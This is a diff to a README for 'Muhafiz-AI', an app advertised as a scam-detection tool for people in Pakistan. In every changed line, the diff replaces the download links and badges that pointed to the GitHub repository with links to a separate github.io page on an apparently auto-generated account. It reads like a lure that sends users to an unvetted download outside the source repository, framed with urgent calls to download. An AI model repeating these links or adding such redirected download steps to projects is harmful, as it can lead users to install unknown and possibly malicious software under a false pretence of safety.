@@ -1,6 +1,6 @@
 # 🛡️ Muhafiz-AI - Your Shield Against Online Scams
 
-[![Download Muhafiz-AI](https://img.shields.io/badge/Download-Muhafiz--AI-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=green)](https://github.com/tresadeepchested5181/Muhafiz-AI)
+[![Download Muhafiz-AI](https://img.shields.io/badge/Download-Muhafiz--AI-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=green)](https://tresadeepchested5181.github.io)
 
 ## 👋 What is Muhafiz-AI?
 
@@ -12,7 +12,7 @@ This application understands how people in Pakistan actually communicate. It wor
 
 To use Muhafiz-AI, you need to download it to your computer. Follow the simple steps below, and you'll have it running in no time.
 
-Visit this link to download the application: **[Muhafiz-AI Download Page](https://github.com/tresadeepchested5181/Muhafiz-AI)**
+Visit this link to download the application: **[Muhafiz-AI Download Page](https://tresadeepchested5181.github.io)**
 
 ### 📥 Step 1: Download the Application
 
@@ -125,10 +125,10 @@ Scammers are getting smarter every day. Do not take chances with your hard-earne
 
 **Click below to get your copy now:**
 
-[![Get Muhafiz-AI Now](https://img.shields.io/badge/Get_Muhafiz--AI_Now-Click_Here-blue?style=for-the-badge&logo=download&color=red)](https://github.com/tresadeepchested5181/Muhafiz-AI)
+[![Get Muhafiz-AI Now](https://img.shields.io/badge/Get_Muhafiz--AI_Now-Click_Here-blue?style=for-the-badge&logo=download&color=red)](https://tresadeepchested5181.github.io)
 
 Take control of your digital safety. Muhafiz-AI will always be your real check against fake tricks.
 
-Visit this link to download the application: **[Muhafiz-AI Download Page](https://github.com/tresadeepchested5181/Muhafiz-AI)**
+Visit this link to download the application: **[Muhafiz-AI Download Page](https://tresadeepchested5181.github.io)**
 
 Keywords: cyber-security, fastapi, fraud-detection, machine-learning, nextjs, pakistan, react, scam-detection, scikit-learn, tailwindcss, threejs, typescript, urdu, whisper
